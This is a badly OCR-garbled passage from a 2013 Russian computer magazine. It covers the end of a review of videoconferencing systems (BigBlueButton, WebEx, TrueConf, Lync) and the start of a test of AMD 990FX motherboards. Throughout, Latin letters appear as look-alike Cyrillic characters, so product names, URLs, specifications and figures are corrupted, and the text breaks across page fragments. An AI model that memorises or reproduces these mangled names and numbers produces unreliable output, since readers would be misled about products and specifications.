ми возможностями ВВВ, не устанавливая систему. 



СІБСО ѴѴЕВЕХ 



Чтобы общаться с группой людей, не обязательно устанавливать 
свой сервер или закупать оборудование, в некоторых случаях 
достаточно и БааБ. Так, боодіе Таік и Бкуре позволяют собрать 
аудиоконференцию на несколько пользователей. Кроме того, 
Бкуре для бизнес-пользователей (для Ьоте требуется Ргетіит- 
подписка) позволяет организовать видеоконференции до 
десяти участников. Стоимость подписки относительно невысо- 
ка, а возможностей вполне достаточно для небольших органи- 
заций. Но одно из самых популярных БааБ-решений — сервис 
веб-конференций Сізсо ѴѴеЬЕх ( ѵѵеЬех.сот ). который предлагает 
качественную видео- и аудиосвязь, не требуя установки специ- 
ализированного оборудования. По сути, это удобная платформа 
для общения, удаленного обучения и совместной работы, где реа- 
лизованы все необходимые функции: предварительное обсужде- 
ние материалов, зсгееп-зЬагіпд, ѵѵЬіІеЬоагсі, удаленный кон- 
троль компьютера, презентации, ѴоІР, видео в НШ-формате, чат, 
запись совещания на сервере или клиенте, календарь и прочее. 
Возможно предоставление участникам разного рода анкет для 




ВідВІиеВийоп позволяет организовать конференцию нажатием одной кнопки 

ект присоединился к бизнес-инкубатору для открытых проектов 
ѴѴеЬРѴѴО («ѴѴеЬ Рогѵѵагсі»), который поддерживает МогіІІа. 

ВідВІиеВіШоп обеспечивает многопользовательские аудио- 
и видеоконференции, чат и обмен личными сообщениями (в каче- 
стве клиента поддерживается только собственный ^ѵа-апплет 
ВідВІиеВиЦоп), запись лекций (слайды, аудио и чат) для дальней- 
шего воспроизведения (используется НТМІ_5, поддерживается 
пока ГР и СЬготе), предоставление общего доступа к рабочему 
столу для практического показа работы с приложениями и ОС, за- 
грузку презентации в формате РРР (и любом другом, поддерживае- 
мом Ореп(Жісе.огд/1_іЬге(Шісе), функции рисования и виртуальную 
указку. Реализован автоматический перевод при общении в чате 
пользователей на разных языках. Для подключения к серверу до- 
статочно использовать веб-браузер с поддержкой АсіоЬе РІазЬ, то 
есть это может быть любой компьютер, работающий под управле- 
нием ѴѴіпсіоѵѵ5, *піх или Мае 05 X. Ведется разработка клиента для 
Апсігоігі. Конференции могут быть двух видов: открытые (может 
подключиться любой зарегистрированный пользователь) и за- 
крытые. В случае приватной конфы список допущенных формирует 
сам выступающий, высылая им данные для доступа. Пользователи 
в конференции могут быть в роли выступающего, модератора (по 
умолчанию получает создатель конференции) и слушателя. Работа 
виртуального лектора мало отличается от реального: кроме видео, 
он загружает документы, используя указку, акцентирует внима- 
ние на важных моментах, включает аудио выбранного слушателя. 
Модератор может назначить любого пользователя выступающим, 
тогда все внимание будет переключено на него. Интерфейс пользо- 
вателя позволяет приблизить отдельные фрагменты, чтобы лучше 
рассмотреть их, привлечь внимание, «подняв руку», общаться 
в групповом или приватном чате. Модератор полностью контроли- 
рует возможности присутствующих, при необходимости отключает 
пользователя или переводит в режим «только просмотр». Поддер- 
живается разрешение 320 * 240, 640 х 480, 1280 х 720, на количе- 
ство подключений ВВВ каких-либо ограничений не накладывает. 

В своей работе ВВВ использует более десятка Ореп Боигсе 
приложений: РгееБѴѴІТСН, пдіпх, РІазЬ-медиасервер РесІ5, 

Му5С)І_, АсІіѵеМО, Тотсаі, Весііз, бгаііз, Хиддіег, ОрепСШісе. 
огд, Ітаде Мадіск, БѴѴРТооІз и другие. Ранее в этом списке был 
ІР-РВХ Азіегізк с модулем для управления конференциями 
арр_коп(егепсе, но в последних версиях разработчики отказались 
отданной связки в пользу РгееБѴѴІТСН, так как последний не 
требует дополнительных усилий при реализации функции записи. 
Веб-интерфейс ВВВ переведен на 40 языков, в этом списке есть 
и русский. 



128 



ХАКЕР 01 /168/2013 




Лицом к лицу 





Функция трансляции рабочего стола в ВідВІиеВиМоп 



заполнения. Приглашение можно разослать при помощи е-таіі, 
по телефону или через ІМ-клиент. Причем аудио-конференц- 
связь возможна не только через ѴоІР, но и через мобильный/ста- 
ционарный телефон. Также ѴѴеЬЕх интегрируется с ѴѴеЬЕх БосіаІ 
и приложениями МБ СЖісе, позволяя совместно редактировать 
и публиковать документы. При помощи специального плагина 
пользователь публикует материалы и планирует совещания в МБ 
ОиІІоок, полученное приглашение сразу добавляется в кален- 
дарь. Для доступа к видеоконференции пользователю достаточ- 
но подключиться к ней при помощи браузера. Доступны клиенты 
для іРЬопе, іРасІ, Мокіа и ВІаскВеггу. Соединение защищено при 
помощи 55І_. Интерфейс очень простой, хотя и не локализован- 
ный. Распространяется по подписке, в настоящее время реали- 
зовано четыре уровня доступа — Ргее (до трех участников, видео 
стандартного качества, 250 Мб места на диске для файлов), 
Ргетіит 8, Ргетіит 25 (соответственно до 8 и 25 участников, 1 
Гб места и дополнительные функции) и Епіегргіве (до 500 участ- 
ников). Чтобы активировать Ргее-аккаунт, достаточно просто 
зарегистрироваться (на 14 дней дают еще и тестовый Ргетіит), 
указав валидный е-таіі. 



ТРІІЕСОИР 5ЕРѴЕР 



Сервер видеоконференций ТгиеСопІ Бегѵег ( ігиесопі.ги ) поддер- 
живает несколько режимов вещания: персональное, симметрич- 




Планирование конференции в \Л/еЬЕх 



ная многоточечная конференция (до 16 равноправных участни- 
ков), видеовещание (до 16 участников, но активен только один), 
ролевое видеовещание (3 активных участника, до 120 пользова- 
телей). В последнем случае пользователи не могут разговаривать 
друг с другом, но в их распоряжении другие встроенные средства 
ТгиеСопІ — чат, обмен файлами, электронная доска для совмест- 
ной работы над документом, демонстрация слайд-шоу. Качество 
может варьироваться от 320 х 240 до НЮ (1280 х 720). Реализова- 
на возможность записи конференции, адресная книга и панель 
статусов. Пользователь может показать свой рабочий стол другим 
участникам, которые, в свою очередь, получив разрешение, им 
управляют. Группы пользователей получают различные права, 
разграничивающие возможности по использованию системы. 

Для подключения к конференции требуется ѴѴіпсіоѵѵб-ПК (после 
установки сервер генерирует клиент ТгиеСоп* СІіепі) или специ- 
альное оборудование. Доступен также клиент для Апсігоісі. При 
помощи отдельного продукта ТгиеСопІ баіеѵѵау возможно исполь- 
зование Н.323/5ІР видеотерминалов. 

Продукт появился в 2003 году и первоначально распростра- 
нялся под названием ѴіЬеоРогІ ѴС5, новое имя ТгиеСопІ получил 
в 2011 году. Разрабатывается российской компанией, а поэто- 
му учитывает местные реалии. В частности, нетребователен 
к качеству соединения, может использовать любые каналы, 
в том числе и спутниковые, работает из-за МАТ. В программе 



ЧТО ВЫБРАТЬ ДЛЯ ВИДЕОСВЯЗИ: ЖЕЛЕЗО ИЛИ СОФТ? 



Кроме программных решений, на 
рынке присутствует большой выбор 
аппаратных реализаций, которые 
обеспечивают более высокую произво- 
дительность и качественную видео- 
связь, но и стоят на порядок дороже. 
Разработчики программ нередко идут 
на компромиссы, используя низкую 
частоту кадров и упрощенные алгорит- 
мы преобразования видео, что приво- 
дит к уменьшению размера изображе- 
ния, снижению четкости и ухудшению 
цветопередачи. Аппаратные 



же решения оснащены специализиро- 
ванными процессорами для коди- 
рования и декодирования потока, 
компания-изготовитель гарантирует 
качество связи и конкретную про- 
изводительность в определенных 
условиях (соответственно, отпадает 
необходимость в самостоятельном 
подборе комплектующих и расчете 
требуемой мощности сервера, доста- 
точно выбрать наиболее подходящую 
модель из линейки продуктов). Среди 
поставщиков железа для проведения 



аудио- и видеоконференций есть и 
признанные лидеры, такие как Аѵауа и 
Роіусот. Например, система Аѵауа Аига 
СопГегепсіпд обеспечивает проведе- 
ние конференций с использованием 
протокола 51 Р при помощи клиента 
или обычного веб-браузера, а Роіусот 
НйХ 8000 позволяет пользователям 
общаться с видео высокого качества 
|720р/1080р) и звуком без искажений, 
при этом голоса разделяются на 
каналы, обеспечивая «эффект 
присутствия». 



• СайтАрасЬеОреп- 
Мееііпдз: 

іп сиЬаІог.арасЬе. 

огд/орептееІіпд5; 

• сайт проекта 
ВідВІиеВиМоп: 

ЬідЫие ЬиМоп.огд . 
согіе. доодіе. сот /р/ 
ЫдЫие Ь иМо п; 

• результаты стресс- 
теста ВідВІиеВиМоп: 

дор.дІ/Ьгк1_Р; 

• сайт Сібсо ѴѴеЬЕх: 

ѵтѵѵ.ѵѵеЬе х.сот: 

• сайтМ5І.упс: 

; 

• сайтТгиеСоп* 
Бегѵег: ігиесопГ.ги . 



ХАКЕР 01 /168/2013 



129 





5ѴЫ/АСК 



заложена динамическая регулировка битрейта и технология БѴС 
(БсаІаЫе Ѵісіео Сосііпд), позволяющая передавать в одном потоке 
несколько подпотоков видео различного качества. Список под- 
держиваемых видеокодеков включает ѴѴеЬМ и Сусіоп. Последний 
собственной разработки, не требует мощного СРІ) и обеспечивает 
малые задержки, а поэтому применяется на низкоскоростных 
линиях. Такой эффект достигается в том числе и за счет того, что 
кодек в первую очередь распознает лица участников видеокон- 
ференции. Для асимметричной конференции используется ІШР 
Миііісазі. 

Для установки сервера понадобится ѴѴіп2к/2кЗ/2к8. Сам про- 
цесс, можно сказать, тривиален, справиться с ним может любой 
пользователь. В (ігеѵѵаІІ нужно лишь открыть порты 4307 и 4310. 
Доступна также БааБ-версия ТгиеСопІ — ТгиеСопІ Опііпе, позволя- 
ющая организовывать конференции по подписке, не разворачивая 
инфраструктуру. Пользователю требуется веб-камера, микрофон 
и браузер. Предлагается несколько вариантов лицензий, в бес- 
платной возможна только индивидуальная видеосвязь. 



МІСВОБОРТ ЬУЫС 5ЕВѴЕК 



Корпорация МісгозоК не могла не посчитаться с тенденциями 
развития ІТ-рынка и предложила свой сервер коммуникаций 
МБ Супе Бегѵег ( Іупс.тісгозоП.сот. ранее ОНісе Соттипісаііопз 
Бегѵег, версия 2007 В2 которого еще продается), предоставляю- 
щий возможности организации не только аудио-, видео- и веб- 
конференций, но и телефонной связи (голосовая почта, перевод 
звонков, групповые вызовы и тому подобное), систему ІМ, пере- 
дачу файлов, контроль присутствия и многое другое. Возможна 
интеграция с Азіегізк и Бкуре, при помощи шлюзов сторонних 
производителей Бупс подключается к 5ІР или телефонным сетям. 
Реализованы возможности совместного доступа к рабочему 
столу, функция виртуальной доски для одновременной работы 
с документом или обучения сотрудников. Для тех, кто пере- 
писывается с иностранными партнерами, предлагается плагин 
Сопѵегзаііоп Тгапзіаіог (1_упс биізііс), позволяющий автомати- 
чески переводить сообщения при помощи сервиса переводчика 
Віпд. Пользователь может подключиться к конференции при 
помощи обычного или мобильного телефона. Естественно, Буле 
интегрируется с многими продуктами МісгозоН — ЕхсЬапде, 
БНагеРоіпІ, ОНісе и ОНісе 365. Пользователям последнего нет 
необходимости разворачивать свою инфраструктуру, достаточно 
подключиться к І_упс Опііпе. Приглашения для участия в конфе- 
ренции по умолчанию отправляются при помощи ОиІІоок. Можно 
организовать несколько конференций и переключаться между 
ними. Есть возможность выбора пользователя, от имени которого 
конференция будет начата. Участник, имеющий слово, будет вы- 




Выбор варианта проведения конференции в ТгііеСопІ 



делен, и камера автоматически переключается на него. Подсо- 
единиться к собраниям можно несколькими способами: установив 
клиент І_упс 2010 или 1_упс 2010 Аиепбее, через веб-браузер с под- 
держкой БіІѵегІідЫ (МісгозоН І_упс ѴѴеЬ Арр) или клиент ОНісе 
Соттипісаіог. Пользователю, получившему приглашение, будет 
предложен один из этих вариантов. Кроме того, поддерживается 
ряд ІР-телефонов «Оріітігесі (ог 1_упс» (некоторые модели можно 
найти на сайте МБ — ооо.оІ/СЗКзЬ ). Для проведения видеоконфе- 
ренций также не требуется специальное оборудование, хотя здесь 
предлагаются совместимые комплекты МБ РоипсІТаЫе, делаю- 
щие общение более комфортным. Доступен клиент І_упс МоЬіІе 
для ѴѴР7, АпгігоісІ, Ю5, БутЬіап и ВІаскВеггу, который упрощает 
подключение к конференции, имеет функции поиска адресата 
и сведений о присутствии сотрудника. 

Благодаря своим возможностям, 1_упс Бегѵег будет интересен 
тем организациям, которые используют ѴѴіпсІоѵѵз и строят или 
реорганизуют свою ИТ-инфраструктуру. 



ЗАКЛЮЧЕНИЕ 



Не зря говорят, что лучше один раз увидеть, чем сто раз услы- 
шать. Системы видеоконференций позволят повысить эффектив- 
ность взаимодействия сотрудников компании и бизнес-партнеров 
и при этом обойтись без дорогостоящих командировок, ш 



КАК РАССЧИТАТЬ ПРОПУСКНУЮ СПОСОБНОСТЬ? 



Практически половина всех попыток внедрений 
систем видеоконференций проваливается из-за 
неготовности сетевой инфраструктуры. Поэтому 
еще на этапе выбора поставщика нужно оценить 
возможности своей сети и требования к пропускной 
способности. Возможно, для поддержки ОоБ на 
уровне, достаточном для проведения видеоконфе- 
ренций, окажется необходимой модернизация. Каж- 
дый производитель обычно дает приблизительные 
расчеты для одного канала. Например, для АрасЬе 
ОрепМееІіпдз каждое подключение к серверу требу- 
ет 256 Кбит/с, хотя клиент может выбрать подклю- 
чение с меньшим качеством, уменьшая требование 



до 160 Кбит/с. В итоге для сервера нужно обеспечить 
(Ы — количество участников): 

• входящий канал — (256 х N1 Кбит/с; 

• исходящий канал — П256хЫх(Ы — 1)) Кбит/с. 

Для клиентской системы: 

• входящий канал — (256 х (N-1)) Кбит/с; 

• исходящий канал — 256 Кбит/с. 

Отдельный поток в ВВВ требует 30-50 Кб/с. 
Приблизительные расчеты для ВВВ можно найти в 
РАО — ооо.дІ/Ріі7У . В том же Бкуре для видеокон- 
ференций рекомендуется более широкий канал — 

4 Мбит/с (прием) / 512 Кбит/с (передача). 



• В ВідВІиеВиМоп 
и МісговоИ І.упс 
Бегѵег реализован 
автоматический 
перевод при 
общении в чате 
пользователей 

на разных языках. 

• В ходе телефонного 
разговора 
усваивается 
примерно 20% 
информации, личное 
общение поднимает 
эту планку до 

80%. Система 
видеоконференции 
позволяет усвоить 
до 60%. 



• боодіе, выкупив 
в 2007 году 
бесплатный 
сервис для 
видеоконференций 
МаггаІесЬ, так 

и не создала 
«убийцу \ѴеЬЕх», 
но старые версии 
сервера и клиента 
еще можно найти 
в интернете 
и использовать 
для общения пяти 
участников. 

• ВТгиеСоп! 
предусмотрена 
аутентификация 
пользователей 
средствами ЮАР 
или Асііѵе йігесіогу. 



130 



ХАКЕР 01 /168/2013 







РЕРРІІМ 



Сергей Плотников 



ЬА РІІКІА 

Ш 



В 



ТЕСТИРОВАНИЕ 
ТОПОВЫХ МАТЕРИНСКИХ 
ПЛАТ НА БАЗЕ ЧИПСЕТА 
АМР 990РХ 



Думаем, мы не откроем Америки, если скажем, что процессоры архитектуры ВиІІсІогег 
оказались не слишком удачными. Тем не менее подобное нельзя отнести в адрес материнок 
на базе логики АМй. И вот мы решили протестировать топовые платы на чипсете 
990РХ — настоящие «красные фурии»! 



ВОПРОС ЦЕНЫ 

Что интересно, воспользовавшись популяр- 
ными маркет-ресурсами, легко выяснить, 
что Ні-Епсі-плата для процессоров АМй стоит 
ощутимо меньше, нежели Ні-ЕпсІ-плата под Іпіеі. 
В качестве примера: материнская плата АБІІБ 
5АВЕРТ00ТН 990РХ на момент написания теста 
стоила в среднем 5500 рублей, а 5АВЕРТ00ТН 
177 — в среднем 8500 рублей. Чувствуешь раз- 
ницу? При этом набор логики 990РХ ни в чем 
не уступает 277 Ехргезз. И даже больше: если 
центральные процессоры Бапсіу Вгісіде и Іѵу 
Вгісіде имеют встроенный контроллер РСІ 
Ехргезз на 16 линий, то северный мост «девять- 
сот девяностого» — полноценные 32 линии. 
Понятное дело, что «камешки» Іпіеі производи- 



ж 






Мт 


і 


шш 



• АЗРоск Раіаіііу 990РХ Рго*е55ІопаІ 

• А51І5 Сго$$Наіг V Рогтиіа 

• ВІ05ТАР ТА990РХЕ 

• 6І0АВѴТЕ ОА-990РХА-ІШ7 

• М5І 990РХА-6080 



ТЕСТОВЫЙ СТЕНД 



Процессор: АМЦ РЬепот II Х4 970ВЕ, 
01800 МГц (200x9) 

Кулер: Мосіиа N4-014 

Оперативная память: Согзаіг СМ6ТХ7, 
1 х 4 Гб 

Видеокарта: 2 * АМО Расіеоп НО 7950 
Накопитель: Согзаіг С550-Р1206В2, 
120 Гб 

Блок питания: ЕИЕРМАХ Ріаіітах, 

750 Вт 

ОС: ѴѴіпгіо\ѵ5 7 Максимальная 



тельнее. Однако, во-первых, разница в произ- 
водительности сопоставима с разницей в цене 
СРІІ. Во-вторых, и РЬепот II, и РХ обладают 
потрясающим оверклокерским потенциалом. 

В итоге разогнанного до 4.5-5 ГГ ц процессора 
«красных» хватит для прокачки пары топовых 
видеокарт. 

ВОПРОС ПОКОЛЕНИЙ 

Как показывает практика, собирать систе- 
му на базе логики АМО — весьма и весьма 
выгодное дело. И не только из-за экономии 
на покупке комплектующих, но и благодаря 
возможности постепенного, рационального 
апгрейда. В первую очередь речь, конечно, идет 
о замене процессоров. В платах на базе 990РХ 
применяется сокет АМЗ+, который отлично 
ладит как с процессорами архитектуры К10, так 
и с процессорами ВиІІгіогег. Наверняка следую- 
щее поколение «камней» также будет совмести- 
мо с АМЗ-гнездом. От пользователя потребуется 
лишь обновить ВІ05 материнской платы. 

Естественно, у процессоров АМй разного 
поколения существуют соответствующие огра- 
ничения. Например, РЬепот II и АіЫоп II могут 
работать с ОЗУ частотой 800 МГц, а ЕХ — с ча- 
стотой 933 МГц. 

С ДЛИННЫМ «ХОБОТОМ» 

В отличие от Іпіеі, платформы АМО дают овер- 
клокерам полнейшую свободу действий. Мате- 
ринские платы имеют, если так можно выра- 
зиться, разблокированный тактовый генератор. 
А процессоры — разблокированный множитель. 
К тому же сами «железки» показывают превос- 
ходные разгонные способности. Именно на базе 
логики АМО на сегодняшний день установлены 



крупнейшие мировые рекорды по разгону про- 
цессоров и оперативной памяти. 

МЕТОДИКА ТЕСТИРОВАНИЯ 

В распоряжении у тестовой лаборатории име- 
ется множество процессоров АМО. Мы взяли 
«камень» АМО РЬепот II Х4 970, доскональ- 
но изучили его оверклокерский потенциал 
и начали поднимать частоту шины. Дабы СРІІ 
и ОЗУ не стали бутылочным горлышком, ча- 
стота центрального процессора была снижена 
до 200 х 9= 1800 МГц, а памяти — до 1066 МГц. 
Постепенно, шаг за шагом, мы находили тот 
максимум показателя ВСГК материнской 
платы, которого удастся достичь с применением 
воздушной системы охлаждения. Стабильный 
максимум. Стабильность проверялась в течение 
20 минут утилитой ЫпХ. 

Минимумом будем считать отметку в 230 МГ ц. 
Подняв до такого параметра Виз Бреесі, можно, 
например, для системы вместо оперативной 
памяти частотой 1866 МГц прикупить кит ча- 
стотой 2133 МГц. Если плата не тянет 230 МГц, 
то ни о каком высокопроизводительном ре- 
шении речи и не идет. Чуть забегая вперед, 
скажем, что в сегодняшнем тесте все участники 
без проблем преодолели данную отметку по ча- 
стоте. Разгон до 250 МГц является удовлетвори- 
тельным, средним результатом. 

Оверклок по шине свыше 270 МГц мы 
считаем воистину великолепным! Важно пом- 
нить, что результаты разгона компьютерного 
«железа» относятся исключительно к кон- 
кретному устройству. Также мы досконально 
изучили возможности тестируемых материнских 
плат: их разводку, комплектацию, функционал, 
юзабилити. 



132 



ХАКЕР 01 /168/2013 




І_а Ригіа Ноіа 



А5К0СК РАТАИТУ 990РХ РЯ0РЕ55ЮЫАІ. 



□ ткрывает тест материнских плат про- 
дукт компании АБРоск. А тут перед 
нами еще и старая знакомая — Раіаіііу 
990РХ Рго^еззіопаІ! То, что к разработке устрой- 
ства приложил руку Джонатан Уэндел (он же 
РаІаІИу), видно сразу: система охлаждения, да 
и вся плата целиком, стилизованы на все 100%. 
Кроме того, радиатор еще и достаточно эффек- 
тивно охлаждает десятифазную подсистему 
питания и мосты логики. Привлекают внимание 
и «позолоченные» японские конденсаторы. 

В общем, выглядит все достаточно кошерно. 

На текстолите распаяно сразу три порта 
РСІ Ехргезз х16. Они все хоть и раскрашены 
одним красным цветом, но работают по схеме 
ХІ6 + ХІ6 + х4. Соответственно, ты можешь 
собрать систему на базе простеньких двойных 
массивов видеокарт АМй СгоззРігеХ и МѴЮІА 
БЫ. 

Помимо РЕО, на плате в наличии есть пара 
РСІ Ехргезз хі и столько же РСІ. На наш взгляд, 
разводка компонентов выполнена на отлично. 
Установка двух габаритных видеокарт пусть 
и лишит возможности использовать по одному 
РСІ Ехргезз хі и РСІ, но ровно столько же портов 
останутся свободными. 

Стоит отметить, что АБРоск Раіаіііу 990РХ 
Ргоіеззіопаі оснащена сразу двумя сетевыми 
контроллерами. Следовательно, на І/О-панели 
есть два Р.І-45-коннектора. А вот почему мате- 
ринскую плату, ориентированную на геймеров, 
не оснастили нормальным аудиопроцессором, 
для нас остается загадкой. Здесь за звук от- 
вечает стандартный кодек РеаІІек. На всякий 
случай сообщаем, что у Сгеаііѵе есть в продаже 
модель дискретной звуковой карты РесопЗО 
Раіаіііу СЬатріоп. Отличное решение для про- 
фессиональных геймеров. И не только. 

Уже в основном для оверклокеров на тек- 
столите нашлось местечко для кнопок включе- 
ния/перезагрузки системы, а также индикатора 
Р05Т. 

ВІ05 материнской платы, а точнее, ІІЕРІ- 
оболочка приветствует нас завораживающим 
лого Раіаіііу. Все основные настройки по разго- 
ну «железа» находятся во вкладке ОС Тѵѵеакег. 
Первая из них — ОС Мобе, позволяющая путем 
нажатия всего одной кнопки разогнать систему 
на 50% с шагом в 5%. Фишка в том, что после 
активации режима ОС Мобе ВІ05 материнки 
сам выставляет все показатели напряжений, 
множителей и частот. Правда, стенд пере- 
стал стабильно работать уже при 30%, то есть 
при значении ВСІ_К 260 МГ ц. А вот на 25% 

(250 МГц по шине) система работала стабильно. 

При изменении напряжений компонентов 
оболочка не отображает цветом опасные по- 
роги. Максимум для СРП — 2 В. В домашних 
условиях юзать процы с таким напряжени- 
ем — смерти подобно. А вот во время экс- 
тремального оверклокинга бывают моменты, 
когда понадобится поднять ѴСоге еще выше - 
до 2,1 В. Шаг поднятия разности потенциалов 
ѴСоге — 0,0125 В. 



Есть у АБРоск Раіаіііу 990РХ РгоІеБЗІопаІ 
один неприятный момент. При переразгоне 
клавиши включения/ребута и РОБТ-индикатор 
отключаются и начинают снова работать только 
после полного обесточивания системы. 

В итоге разгонные процедуры заставили 
АБРоск Раіаіііу 990РХ Ргоіеззіопаі стабильно 
работать при частоте шины 282 МГц. Данный 
результат можно считать более чем положи- 
тельным. 



□ высокий разгонный 
потенциал 

□ два Р.І-45 

□ оверклокерские 
улучшайзеры 

В мало БАТА-портов 

□ простенький 
РеаІІек'овский 
аудиокодек 




ХАКЕР 01 /168/2013 



133 








ГЕККІЖ 




□ высокий разгон- 
ный потенциал 

□ разводка 

□ игровая звуковая 
карта 

□ оверклокерские 
улучшайзеры 

□ 4 115В 3.0 на 
І/О-панели 



В не обнаружено 



АЗІЯ СК055НАІК V ГОКМІЛА 



ели кто не знает, то мы напомним, 
что линейка плат РОС (ВериЫіс о* 
беатегз) как раз стартовала с выхода 
материнки А5115 СгоззЬаіг, выполненной на базе 
чипсета МѴЮІА пРогсе 590 БЫ специально 
для процессоров АМй. С тех пор утекло достаточ- 
но много воды, у субкультуры изменился дизайн, 
стиль, но принципы остались неизменными: 
давать геймерам и энтузиастам только самое 
лучшее. И вот просим любить и жаловать — А51І5 
СгоззЬаіг V Рогтиіа! 

На что сразу обращаешь внимание — это 
на нестандартную распайку северного моста. 



В итоге радиатор, который отвечает за ох- 
лаждение десятифазной подсистемы питания 
и чипа, сделан продолговатым, но компактным. 
Что, в свою очередь, позволяет устанавливать 
на процессор кулер любого размера. Прове- 
рено на ІМосІиа N4-014, ТЬегтаІгідМ АгсЬоп, 
ТЬегтаІгідМ Бііѵег Аггоѵѵ и ТЬегтаІІаке Ргіо. 

Из примечательных компонентов на плате мы 
заметили дополнительные 4 пина для питания 
процессора и дополнительный МОІ_ЕХдля пита- 
ния РЕС-портов. 

На АБІБ СгоззЬаіг V Рогтиіа распаяно сразу 
четыре РСІ Ехргезз хіб. Один из них изначально 



работает в режиме х4. Остальные, в зависи- 
мости от используемого массива видеокарт, 
могут делиться согласно схеме хіб + х8 + х8. Все 
необходимые мостики идут в комплекте. Также 
на текстолите пятой «рампаги» нашлось место 
для одного РСІ Ехргезз хі и одного РСІ. 

В общем и целом разводка компонентов 
А5115 СгозгЬаіг V Рогтиіа не вызывает каких- 
либо нареканий. 

Отметим, что у нас на тесте побывала просто 
А51І5 СгоззЬаіг V Рогтиіа. Но есть вариация 
с комбинированной картой Р06 ТЬипгіегВоІІ. 
Данное дискретное устройство представляет 
собой производительный сетевой контроллер 
КіІІег Е2100 и звуковой процессор С-Месііа 6631. 

Заходим в ВІОБ. Основное меню — Ехігете 
Тѵѵеакег, в котором находятся все настройки 
по разгону комплектующих. Так, в подменю 
Аі Оѵегсіоск Типег можно выбрать режим 
МапиаІ, при котором все настройки необходимо 
выставлять вручную, а также режим ХМР. 

Параметры напряжений ты можешь уста- 
навливать в двух режимах: оКзеІ или тапиаі. 

При этом система сигнализирует тебе разными 
цветовыми индикациями о том, какой порог 
при увеличении вольт ты перешагнул. Крас- 
ный цвет — опасное напряжение. Отметим, 
что разность потенциалов на процессор можно 
подавать с шагом 0,0625 В. 

Интересны в изучении и функции Хігете 
Тѵѵеакіпд и Ехігете ОѴ. 

В целом ВІОБ А51І5 СгоззЬаіг V Рогтиіа про- 
сто поражает набором оверклокерских функций. 
При желании изучать возможности данной 
платы можно часами! А потому неудивительно, 
что именно пятая «формула» продемонстри- 
ровала лучшие результаты по разгону в тесте. 
Скажем больше: если бы мы зарегистрировали 
результат в 325 стабильных мегагерц на ресурсе 
ЬѵѵЬоСогсь то заняли бы 16-е место в общем 
зачете по разгону А5У5 СгоззЬаіг V Рогтиіа. 
Первое же место занимает британский энтузиаст 
Іорсіод с результатом 405 МГ ц. 

И это еще не все. Именно при помощи А5115 
СгоззЬаіг V Рогтиіа установлен ряд интересней- 
ших мировых рекордов по разгону. Например, 
по разгону СРІІ вообще. На момент написания 
статьи он принадлежал тайваньскому овер- 
клокеру Апсіге Уапд, сумевшему разогнать АМй 
РХ-8150 до 8709,1 МГц! 



ТЕХНИЧЕСКИЕ 

ХАРАКТЕРИСТИКИ 



Память: 

Слоты расширения: 

Дисковые контроллеры: 
Сеть: 

Звук: 

Разъемы на задней панели: 



Форм-фактор: 






ОйВЗ, 800-2100 МГц 
3 х РСІ Ехрге$5 хіб, 2 * РСІ Ехргезз хі, 

2 х РСІ 
6 х 5АТА 3.0 

ЕІЬегпеІ, 10/100/1000 Мбит/с 
7.1 -сЬаппеІ НОА 

2 х Ц$В 3.0, 5 х 115В 2.0, 1 х Раіаіііу 
Моизе Щ5В 2.0), 2 х 5/РйІР, 1 х РігеМге, 
2 х еЗАТА, 2 х Я.І-45, 2 х Р5/2, 6 х аудио 
АТХ 



И А51І5 СгоззЬаіг V 
Рогтиіа 

йОРЗ, 1066-2133 МГц 
4х РСІ Ехргезз хіб, 

1 х РСІ Ехргезз хі. 1 х РСІ 
7 х 5АТА 3.0, 1 х еЗАТА 3.0 
ЕіЬегпеІ, 10/100/1000 Мбит/с 
7.1-сЬаппеІ НРА, ЗиргетеРХ Х-Рі 2 
4 х изв 3.0, 8 X изв 2.0, 1 X З/РОІР, 1 х еЗАТА, 
1 х В .1-45, 1 х Р5/2, 6 х аудио 

АТХ 



134 



ХАКЕР 01 /168/2013 







1_а Ригіа По]а 



ВІОБТАР ТА990РХЕ 



□ теперь познакомимся с материнкой 
ВІОБТАР ТА990РХЕ. Начнем с того, 
что перед нами самая дешевая плата 
из представленных в сегодняшнем тесте. 

И одна из самых дешевых плат на базе набора 
логики 990РХ вообще. Так что покупка ВІОБТАР 
ТА990РХЕ может оказаться весьма и весьма вы- 
годной операцией. 

Как оказалось, потенциал топового чипсе- 
та «красных» использован не полностью. Так, 
на текстолите распаяно сразу три порта РСІ 
Ехргевз х16. Два из них — полноформатные и ра- 
ботают по схеме хіб + хіб. Еще один — по схеме 
х4. Легко догадаться, что полноценные РЕ6 
окрашены в один цвет. Также на плате имеется 
еще один РСІ Ехргевз хі и парочка РСІ. По неиз- 
вестным нам причинам ВІОБТАР ТА990РХЕ имеет 
в своем распоряжении всего пять портов БАТА 3.0. 

И тут у нас появились конкретные вопросы 
к разработчикам. Правильность разводки слотов 
расширения подвергается сомнению. Представим, 
что на базе ВІОБТАР ТА990РХЕ мы будем собирать 
топовую конфигурацию с парой габаритных 
видеокарт. В таком случае при интегрировании 
графических адаптеров в соответствующие белые 
порты мы с 99-процентной вероятностью (наличие 
топовых видеокарте однослотовыми системами 
охлаждения на сегодняшний день — большущая 
редкость) «потеряем» нижестоящие РСІ Ехргезз 
хі и РСІ Ехргезз х4. Из слотов расширения 
останутся лишь парочка доисторических РСІ. 

И что делать? Почему нельзя было установить РСІ 
Ехргезз хі на место МОІ_ЕХ (который также рас- 
положен не совсем удобно), чуточку видоизменить 
радиатор, а нижний РСІ поменять местами с РСІ 
Ехргезз х4? В таком случае даже с учетом установ- 
ленных двух видеокарт мы бы имели в своем рас- 
поряжении и РСІ Ехргезз хі, и РСІ, и РСІ Ехргезз 
х4. В итоге сборка ПК с использованием большого 
числа дискретных девайсов с ВІОБТАР ТА990РХЕ 
будет несколько осложнена. Обидно. 

Отметим и наличие клавиш включения/ребута 
системы, а также индикатора РОБТ-сигналов. 

Все функции по разгону системы находятся 
в меню О.ІЧ.Е. Изменять параметры процессора 
можно в меню АМй Рзіаіе Соп(ідигаІіоп. Настро- 
ек — раз, два и обчелся. Но для разгона на воз- 



духе — хватит вполне. Напряжения компонентов 
системы можно изменять только в режиме 
ОНзеІ, что, на наш взгляд, не совсем удобно. 

Наконец, ВІОБТАР ТА990РХЕ оснащена функ- 
цией автоматического разгона — Аиіо ОѵегСІоск 
Бузіетз. Она подразумевает активацию трех 
режимов ТесЬ Епдіпе: Ѵ6, Ѵ8 и Ѵ12. Начальная 
стадия поднимает частоту тактового генератора 
до 220 МГ ц. Режим Ѵ8 — до 230 МГ ц. Режим 
VI 2 — до 240 МГц. Отметим, что при актива- 
ции последнего режима система стартовать 
категорически отказалась. Тем не менее само- 



